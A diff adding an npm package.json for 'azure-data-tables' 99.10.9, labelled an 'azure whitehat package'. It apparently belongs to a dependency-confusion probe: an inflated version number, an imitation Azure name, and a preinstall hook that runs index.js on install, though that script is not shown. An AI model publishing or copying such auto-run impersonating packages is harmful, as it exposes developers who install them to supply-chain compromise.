@@ -1,0 +1,39 @@
+{
+    "name": "azure-data-tables",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-data-tables@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-YFIUU54uRjDnLtBJSBgKuGh1QzhamXYb1ESndOlGWs7/QjygZNP2mhgbifmev1756N3vRDHmAjG09AQi0NQmuw==",
+        "shasum": "9f7b46b1d70d4d7e3f1e65578f917426dfec5a79",
+        "tarball": "https://registry.npmjs.org/azure-data-tables/-/azure-data-tables-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3581,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSgrCRA9TVsSAnZWagAAdZIQAIwHoAKY+CVjDx6Xy3tz\nmeWbbOyq4AP4S2npXjv7TeTnQlgojMBmaUmHpmMG3IOMc+q+KyLH4zshkGjn\nfD4/tIRivU60n6zwIXYHynMaZMztEIe32eGjjZiJtzM17ati76o2Yqu6shEw\nGLA1UEovo1Iqpx3wdZCTVL9fA4vbydao9YwRDBX/cJjnNjApNiww4RWiMMg/\nocH+4lsNjfTlSBwUo67PQ8FBKJAIFL+lp45/ncaBA/3pz3ok9veV1SqOg0pm\ne2tmP80gICEKnmsRn+zf5l3kdgyCOTvfJWNiwKtkQUrbmuTzTkUQP6REUNWU\nx1YvdO3vTUw4IUXIGn/fX+O1bD87LoygIoCpAtJeT9XEITi4K/K+0Aw/JM2A\nH1pA1TT19g1SeWfSRH3E3/hihADxTibB9Mquo5Hafygi4xFf6OayLwB8ORLz\nBxrsAIkjlxmM9ovIAuV1NAZKHKv3HHkQAbVONR3BtHvl/uLI0KBRGfB1AXcb\nufsAGr0PaQ9eAn3b6u3OZPY5vCxQZq/P/Vy2HSYKq6hw15OpS9MOyWZCPMBH\nna9Y9fNWqy7j3XTrcbDjhtkL/fXViiTvIt7raWedUDaa/mX/XjgNs8befiHX\nResDeyTHcKIsJPEcH1zUm5x8qk1k4+q4+vl2HcYggP6ZNFpBjR5DDk5O2g8g\nZ+AP\r\n=DmvB\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-data-tables_99.10.9_1637951531174_0.6440158519948445"
+    },
+    "_hasShrinkwrap": false
+}
